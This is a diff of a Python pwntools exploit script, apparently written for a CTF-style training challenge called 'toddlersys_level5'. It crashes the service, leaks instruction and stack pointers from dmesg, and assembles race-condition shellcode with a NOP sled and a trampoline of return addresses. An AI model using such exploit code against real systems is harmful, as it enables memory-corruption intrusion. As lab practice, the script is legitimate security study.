@@ -1,4 +1,4 @@
-
+#尽力长时间的挣扎，终于承认自己想不出来了
 def getarg(arg):
     if arg[0:2] == "0x":
         return int(arg, 16).to_bytes(1, "little")
@@ -161,6 +161,7 @@ for i in yangasm:
     c += assembly(i)
 
 from pwn import *
+BINARY = "/challenge/toddlersys_level5.0"
 # display the bytes
 # print(disasm(my_sc))
 context.arch="amd64"
@@ -169,42 +170,106 @@ context.os = "linux"
 # context.terminal = ['tmux', 'splitw', '-h']
 # p = gdb.debug("/challenge/toddlersys_level2.0", gdbscript="source /opt/gef/gef.py")
 def load_program(n:connect, i:int, c:bytearray):
-    n.sendline("load_program")
-    n.sendline(str(i))
+    n.sendline(b"load_program")
+    n.sendline(str(i).encode())
     n.send(c)
-def init_ypu(n:connect, i:int):
-    n.sendline("init_ypu")
-    n.sendline(str(i))
+def init_ypu(n:connect, i:int, j:int):
+    n.sendline(b"init_ypu")
+    n.sendline(str(i).encode())
+    n.sendline(str(j).encode())
 def run_ypu(n:connect, i:int):
-    n.sendline("run_ypu")
-    n.sendline(str(i))
+    n.sendline(b"run_ypu")
+    n.sendline(str(i).encode())
+def quit(n:connect):
+    n.sendline(b"quit")
 
-p = process("/challenge/toddlersys_level5.0")
-sleep(4)
 
-# nc = connect("localhost", 1337)
-# sleep(4)
-# Overwrite semaphore counter
-# buf = b'A' * (384 * 32 - 768 * 15)
-# buf += b'\x80'  # new counter
+nc = connect("127.0.0.1", 1337)
 
-# load_program(nc, 15, buf)
+crash_program = 15
+crashing_yancode = b'A' * 0x1000
+load_program(nc, crash_program, crashing_yancode)
+quit(nc)
 
-pid1 = os.fork()
-if pid1 == 0:
-    nc1 = connect("localhost", 1337)
-    load_program(nc1, 0, c)
-    init_ypu(nc1, 0)
-    while True:
-        run_ypu(nc1, 0)
+dmesg = process('dmesg | grep traps | tail -n 1', shell=True)
+dmesg.recvuntil(b'ip:')
+ip_leak = int(dmesg.recvuntil(b' '), 16)
+dmesg.recvuntil(b'sp:')
+sp_leak = int(dmesg.recvuntil(b' '), 16)
+dmesg.kill()
+print("ip_leak: "+hex(ip_leak) + "\nsp_leak: " + hex(sp_leak))
 
-else:
-    nc1 = connect("localhost", 1337)
-    cc = bytearray(c)
-    cc[0x48] = b"\x10"[0]
-    while True:
-        load_program(nc1, 0, cc)
-        init_ypu(nc1, 0)
-        load_program(nc1, 0, c)
-        init_ypu(nc1, 0)
+base_addr = ip_leak - 0x172F
+SHELLCODE = '''
+read_mmap:
+mov rbx, {0}
+mov rcx, [rbx]
+mov [rip + saved_mmap_addr], rcx
 
+do_clone:
+mov r9, QWORD PTR fs:0x10
+xor r8, r8
+lea r10, [r9 + 0x2d0]
+xor rdx, rdx
+xor rsi, rsi
+mov rdi, 0x1200011
+mov rax, 56
+syscall
+cmp rax, 0
+jne parent
+
+child:
+mov rbx, [rip + saved_mmap_addr]
+add rbx, 72
+mov cl, {1}
+mov dl, {2}
+
+race_loop:
+mov byte ptr [rbx], cl
+mov byte ptr [rbx], dl
+jmp race_loop
+
+parent:
+
+ioctl_loop:
+mov rdi, 4
+mov rsi, 1337
+mov rax, 16
+syscall
+jmp ioctl_loop
+
+saved_mmap_addr:
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+.byte 0
+'''
+
+nc = remote('localhost', 1337)
+
+load_program(nc, 0, c)
+init_ypu(nc, 0, 0)
+run_ypu(nc, 0)
+
+
+binary = ELF(BINARY)
+binary.address = base_addr
+ypu_0_mmap_addr = binary.symbols['data'] + 8
+log.info(f'ypu_0_mmap_addr: {hex(ypu_0_mmap_addr)}')
+
+shellcode_program = 0
+shellcode = b'\x90' * 0x100
+shellcode += asm(SHELLCODE.format(ypu_0_mmap_addr, 0x01, 0x20))
+shellcode += b'\x90' * (0x1000 - len(shellcode))
+load_program(nc, shellcode_program, shellcode)
+
+shellcode_addr = sp_leak - 0x3008
+trampoline_program = 15
+trampoline = p64(shellcode_addr)
+trampoline *= int(0x1000 / 8)
+load_program(nc, trampoline_program, trampoline)
+quit(nc)
